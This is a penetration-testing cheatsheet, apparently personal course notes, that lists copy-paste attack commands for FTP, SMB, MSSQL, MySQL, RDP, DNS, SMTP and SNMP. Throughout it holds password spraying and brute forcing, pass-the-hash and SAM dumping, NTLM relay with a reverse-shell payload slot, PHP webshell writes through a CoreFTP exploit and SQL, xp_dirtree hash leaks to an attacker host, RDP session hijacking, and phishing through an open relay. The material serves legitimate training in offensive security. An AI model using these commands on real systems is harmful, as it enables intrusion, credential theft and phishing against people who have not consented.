---
title: "Network Services Cheatsheet"
type: cheatsheet
tags: [cheatsheet, dns, enumeration, exploitation, htb, network, rdp, smb]
date_created: 2026-05-08
date_updated: 2026-05-08
sources: [cpts-common-services]
---

# Network Services Cheatsheet

> Dense command reference — every command is copy-paste ready. See [[network-service-attacks]] for explanation and context.

---

## FTP — Port 21

```sh
# Nmap FTP enum (ftp-anon script auto-runs with -sC)
sudo nmap -sC -sV -p 21 <IP>

# Anonymous login
ftp <IP>
# Username: anonymous | Password: (blank)

# FTP session commands
ftp> ls
ftp> cd <dir>
ftp> get <file>
ftp> mget *
ftp> put <localfile>
ftp> mput *.txt
ftp> binary          # switch to binary mode
ftp> quit

# FTP on non-standard port
ftp -P 2121 <IP>

# Brute force with Medusa
medusa -u <user> -P /usr/share/wordlists/rockyou.txt -h <IP> -M ftp
medusa -U users.list -P passwords.list -h <IP> -n 2121 -M ftp -t 50

# Brute force with Hydra
hydra -l <user> -P /usr/share/wordlists/rockyou.txt ftp://<IP>
hydra -L users.txt -P passwords.txt -f <IP> ftp

# FTP Bounce Attack (scan internal host through DMZ FTP)
nmap -Pn -v -n -p80 -b anonymous:password@<FTP_IP> <INTERNAL_IP>

# CoreFTP CVE-2022-22836 — path traversal + arbitrary write via HTTP PUT
curl -k -X PUT -H "Host: <IP>" --basic -u <user>:<pass> \
  --data-binary "<?php system(\$_GET['cmd']);?>" \
  --path-as-is https://<IP>/../../../../../../var/www/html/shell.php
```

---

## SMB — Ports 139 / 445

### Enumeration

```sh
# Nmap SMB scan
sudo nmap -sC -sV -p139,445 <IP>
nmap -p445 --script smb-protocols <IP>
nmap -p445 --script smb-security-mode <IP>
nmap -p445 --script smb-vuln-ms17-010 <IP>

# List shares — null session
smbclient -N -L //<IP>

# Enumerate shares + permissions — null session
smbmap -H <IP>

# Browse share recursively
smbmap -H <IP> -r <share>
smbmap -H <IP> -R <share>            # recursive

# Download / upload file
smbmap -H <IP> --download "<share>\<file>"
smbmap -H <IP> --upload local.txt "<share>\remote.txt"

# Enumerate with credentials
smbmap -H <IP> -u <user> -p '<pass>'
smbclient //<IP>/<share> -U <user>%<pass>

# RPC null session enumeration
rpcclient -U'%' <IP>
rpcclient $> enumdomusers
rpcclient $> queryuser <username>
rpcclient $> enumdomgroups
rpcclient $> querygroupmem <RID>
rpcclient $> querydominfo

# Enum4linux-ng (full automated null-session recon)
./enum4linux-ng.py <IP> -A -C
enum4linux -a <IP>

# Mount SMB share on Linux
sudo mkdir /mnt/share
sudo mount -t cifs -o username=<user>,password=<pass> //<IP>/<share> /mnt/share
sudo mount -t cifs //<IP>/<share> /mnt/share -o credentials=/path/credfile
# credfile format:  username=user\n password=pass\n domain=.
```

### Credential Attacks

```sh
# Password spray with CrackMapExec
crackmapexec smb <IP> -u /tmp/userlist.txt -p 'Company01!' --local-auth
crackmapexec smb <IP> -u users.txt -p passwords.txt --local-auth --continue-on-success

# Spray across subnet
crackmapexec smb <CIDR> -u administrator -p 'Password123!' --loggedon-users

# Dump SAM hashes (admin required)
crackmapexec smb <IP> -u administrator -p 'Password123!' --sam

# Pass-the-Hash
crackmapexec smb <IP> -u Administrator -H <NTLM_HASH>
impacket-psexec -hashes :<NTLM_HASH> administrator@<IP>
smbmap -H <IP> -u administrator -p '<NTLM:NTLM>'
```

### Remote Execution

```sh
# PsExec-style (drops binary to ADMIN$)
impacket-psexec administrator:'Password123!'@<IP>

# SMBExec (no binary drop, uses cmd.exe)
impacket-smbexec administrator:'Password123!'@<IP>

# atexec (Task Scheduler)
impacket-atexec administrator:'Password123!'@<IP> whoami

# CME exec (smbexec method)
crackmapexec smb <IP> -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
crackmapexec smb <IP> -u Administrator -p 'Password123!' -X 'Get-Process' --exec-method smbexec
```

### NTLM Hash Capture & Relay

```sh
# Responder — capture NTLMv2 hashes (LLMNR/NBT-NS poisoning)
sudo responder -I <interface>
# Hashes: /usr/share/responder/logs/

# Crack captured NTLMv2
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

# NTLM Relay — disable SMB in Responder first
# Edit /etc/responder/Responder.conf → SMB = Off
sudo responder -I <interface>

# Relay (dump SAM)
impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET_IP>

# Relay (execute command / reverse shell)
impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET_IP> -c 'powershell -e <BASE64_PAYLOAD>'
```

---

## SQL Databases — MSSQL (1433) / MySQL (3306)

### Connect

```sh
# MSSQL from Linux
sqsh -S <IP> -U <user> -P '<pass>' -h
mssqlclient.py -p 1433 <user>@<IP>
mssqlclient.py '<domain>/<user>:<pass>@<IP>' -windows-auth

# MSSQL from Windows
sqlcmd -S <IP> -U <user> -P '<pass>' -y 30 -Y 30

# MySQL
mysql -u <user> -p<pass> -h <IP>
```

### Nmap Scan

```sh
nmap -Pn -sV -sC -p1433,3306 <IP>
```

### Basic SQL Enumeration

```sql
-- MySQL
SHOW DATABASES;
USE <db>;
SHOW TABLES;
SELECT * FROM users;

-- MSSQL (add GO after each statement)
SELECT name FROM master.dbo.sysdatabases
GO
USE <db>
GO
SELECT table_name FROM <db>.INFORMATION_SCHEMA.TABLES
GO
SELECT * FROM users
GO
```

### MSSQL — Enable and Use xp_cmdshell

```sql
EXECUTE sp_configure 'show advanced options', 1
GO
RECONFIGURE
GO
EXECUTE sp_configure 'xp_cmdshell', 1
GO
RECONFIGURE
GO
xp_cmdshell 'whoami'
GO
xp_cmdshell 'net user hacker Password123! /add'
GO
```

### MSSQL — Capture Service Hash

```sql
-- Run Responder or impacket-smbserver first
EXEC master..xp_dirtree '\\<ATTACKER_IP>\share\'
GO
-- or
EXEC master..xp_subdirs '\\<ATTACKER_IP>\share\'
GO
```

```sh
# Attacker side
sudo impacket-smbserver share ./ -smb2support
# or
sudo responder -I tun0

# Crack
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

### MSSQL — Read Local Files

```sql
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
GO
```

### MSSQL — Write File (Ole Automation)

```sql
sp_configure 'show advanced options', 1
GO
RECONFIGURE
GO
sp_configure 'Ole Automation Procedures', 1
GO
RECONFIGURE
GO
DECLARE @OLE INT
DECLARE @FileID INT
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\shell.php', 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
EXECUTE sp_OADestroy @FileID
EXECUTE sp_OADestroy @OLE
GO
```

### MSSQL — User Impersonation

```sql
-- Who can we impersonate?
SELECT distinct b.name FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
GO

-- Check current context
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
GO

-- Impersonate
USE master
GO
EXECUTE AS LOGIN = 'sa'
GO
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
GO

-- Revert
REVERT
GO
```

### MSSQL — Linked Server Exec

```sql
SELECT srvname, isremote FROM sysservers
GO
EXECUTE('xp_cmdshell ''whoami''') AT [<LINKED_SERVER_NAME>]
GO
```

### MySQL — Write Webshell

```sql
-- Check restrictions
SHOW VARIABLES LIKE "secure_file_priv";

-- Write shell (empty secure_file_priv = unrestricted)
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';

-- Read file
SELECT LOAD_FILE("/etc/passwd");
```

---

## RDP — Port 3389

```sh
# Nmap scan
nmap -Pn -p3389 -sV <IP>

# Password spray with Crowbar
crowbar -b rdp -s <IP>/32 -U users.txt -c 'password123'

# Password spray with Hydra
hydra -L users.txt -p 'password123' <IP> rdp
hydra -l administrator -P passwords.txt <IP> rdp

# Connect (standard)
xfreerdp /v:<IP> /u:<user> /p:<pass>
xfreerdp3 /v:<IP> /u:<user> /p:<pass>
rdesktop -u <user> -p <pass> <IP>

# Pass-the-Hash via RDP (requires Restricted Admin Mode on target)
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
xfreerdp /v:<IP> /u:<user> /pth:<NTLM_HASH>
```

### RDP Session Hijacking (Windows — requires SYSTEM)

```powershell
# List active sessions
query user

# Create SYSTEM service to hijack session
sc.exe create sessionhijack binpath= "cmd.exe /k tscon <TARGET_SESSION_ID> /dest:<YOUR_SESSION_NAME>"
net start sessionhijack

# Or with psexec to get SYSTEM first
psexec -s cmd.exe
tscon <TARGET_SESSION_ID> /dest:<YOUR_SESSION_NAME>
```

---

## DNS — Port 53

```sh
# Nmap DNS enum
nmap -p53 -Pn -sV -sC <IP>

# Zone transfer (AXFR)
dig AXFR @<NAMESERVER_IP> <domain>
host -t AXFR <domain> <NAMESERVER_IP>

# Fierce — enumerate all nameservers + zone transfer attempt
fierce --domain <domain>

# Subfinder — OSINT subdomain discovery
./subfinder -d <domain> -v

# Subbrute — DNS brute force (works offline/internal)
git clone https://github.com/TheRook/subbrute.git
echo "<resolver_IP>" > resolvers.txt
python3 subbrute.py <domain> -s /usr/share/seclists/Discovery/DNS/namelist.txt -r resolvers.txt

# Check CNAME (subdomain takeover reconnaissance)
host <subdomain>
dig CNAME <subdomain>

# MX records (mail server discovery)
host -t MX <domain>
dig mx <domain> | grep "MX" | grep -v ";"

# DNS lookup
nslookup <hostname> <DNS_SERVER>
dig @<DNS_SERVER> <hostname> A
```

---

## SMTP / Email — Ports 25, 465, 587, 110, 143, 993, 995

```sh
# Nmap email ports scan
sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 <IP>

# MX record discovery
host -t MX <domain>
dig mx <domain>

# Manual SMTP interaction (VRFY)
telnet <IP> 25
EHLO test
VRFY root
VRFY www-data

# Manual SMTP interaction (EXPN)
EXPN support-team

# Manual SMTP interaction (RCPT TO user enum)
MAIL FROM:test@test.com
RCPT TO:john
RCPT TO:kate

# Automated user enumeration
smtp-user-enum -M VRFY -U userlist.txt -t <IP>
smtp-user-enum -M EXPN -U userlist.txt -t <IP>
smtp-user-enum -M RCPT -U userlist.txt -D <domain> -t <IP>

# Brute force SMTP
hydra -l <user>@<domain> -P /usr/share/wordlists/rockyou.txt smtp://<IP> -f
hydra -L users.txt -P passwords.txt <IP> smtp

# Open relay detection
nmap -p25 -Pn --script smtp-open-relay <IP>

# Send email through open relay (phishing)
swaks --from attacker@<domain> --to victim@<domain> \
      --header 'Subject: Urgent' \
      --body 'http://phish.attacker.com/' \
      --server <IP>

# POP3 brute force
hydra -L users.txt -P passwords.txt <IP> pop3
hydra -l <user> -P rockyou.txt -f <IP> -s 55007 pop3

# POP3 manual interaction
nc <IP> 110
telnet <IP> 110
USER <username>
PASS <password>
LIST
RETR 1
RETR 2
QUIT

# POP3 user enumeration
telnet <IP> 110
USER julio       # -ERR = not exist
USER john        # +OK = exists

# IMAP brute force
hydra -L users.txt -P passwords.txt <IP> imap

# O365 user enumeration + spray
python3 o365spray.py --validate --domain <domain>
python3 o365spray.py --enum -U users.txt --domain <domain>
python3 o365spray.py --spray -U users.txt -p 'Winter2024!' --count 1 --lockout 1 --domain <domain>
```

---

## SNMP — Ports 161/162 UDP

```sh
# Nmap SNMP scan
nmap -sU -p161 <IP>
nmap -sU --open -p 161 <CIDR>

# Brute-force community strings
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt <IP>
onesixtyone -c community_strings.txt -i ips.txt

# Walk full MIB tree
snmpwalk -v2c -c public <IP>

# Key MIB OIDs
snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.1       # System info
snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.25.4    # Running processes
snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.25.6    # Installed packages
snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.4.34    # IPv6 addresses
snmpwalk -v2c -c public <IP> 1.3.6.1.4.1.77.1.2.25  # Windows users

# SNMPv3 walk (requires credentials)
snmpwalk -v3 -l authPriv -u <user> -a SHA -A <auth_pass> -x AES -X <priv_pass> <IP>

# SNMP write (if private community known)
snmpset -v2c -c private <IP> <OID> s "new_value"
```

---

## Linux File Share Interaction (Post-Access)

```sh
# Mount SMB share
sudo apt install cifs-utils
sudo mkdir /mnt/share
sudo mount -t cifs //<IP>/<share> /mnt/share -o username=<user>,password=<pass>

# Search for credentials in mounted share
find /mnt/share/ -name "*cred*" -o -name "*password*" -o -name "*.conf"
grep -rn "password" /mnt/share/ --include="*.txt" --include="*.conf"

# Windows CMD (on Windows host)
net use n: \\<IP>\<share> /user:<user> <pass>
dir n:\*cred* /s /b
findstr /s /i cred n:\*.*

# Windows PowerShell
$cred = New-Object System.Management.Automation.PSCredential('<user>', (ConvertTo-SecureString '<pass>' -AsPlainText -Force))
New-PSDrive -Name "N" -Root "\\<IP>\<share>" -PSProvider "FileSystem" -Credential $cred
Get-ChildItem -Recurse -Path N:\ | Select-String "cred" -List
Get-ChildItem -Recurse -Path N:\ -Include *cred* -File
```

---

## Wordlists Quick Reference

| Target | Wordlist |
|--------|----------|
| Passwords | `/usr/share/wordlists/rockyou.txt` |
| Passwords (fast) | `/usr/share/wordlists/fasttrack.txt` |
| Usernames | `/usr/share/seclists/Usernames/top-usernames-shortlist.txt` |
| DNS names | `/usr/share/seclists/Discovery/DNS/namelist.txt` |
| SNMP community | `/usr/share/seclists/Discovery/SNMP/snmp.txt` |
| Directories | `/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt` |

---

## Service Port Reference

| Port | Protocol | Service |
|------|----------|---------|
| 21 | TCP | FTP |
| 22 | TCP | SSH |
| 25 | TCP | SMTP (unencrypted) |
| 53 | UDP/TCP | DNS |
| 80 | TCP | HTTP |
| 110 | TCP | POP3 (unencrypted) |
| 139 | TCP | SMB (NetBIOS) |
| 143 | TCP | IMAP (unencrypted) |
| 161 | UDP | SNMP |
| 443 | TCP | HTTPS |
| 445 | TCP | SMB (direct) |
| 465 | TCP | SMTPS |
| 587 | TCP | SMTP/STARTTLS |
| 993 | TCP | IMAPS |
| 995 | TCP | POP3S |
| 1433 | TCP | MSSQL |
| 1434 | UDP | MSSQL Browser |
| 2433 | TCP | MSSQL (hidden mode) |
| 3306 | TCP | MySQL |
| 3389 | TCP | RDP |

---

## Common Default Credentials to Try

```
admin:admin
admin:password
admin:(blank)
root:root
root:12345678
administrator:Password
sa:(blank)              # MSSQL SA account
anonymous:(blank)       # FTP
public                  # SNMP read community
private                 # SNMP write community
```

---

## Hashcat Mode Reference

| Mode | Hash Type |
|------|-----------|
| 5600 | NetNTLMv2 (SMB/Responder captures) |
| 0 | MD5 |
| 1000 | NTLM |
| 22000 | WPA-PBKDF2-PMKID+EAPOL |
| 1800 | SHA-512crypt (Linux shadow) |
| 3200 | bcrypt |

```sh
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt
```
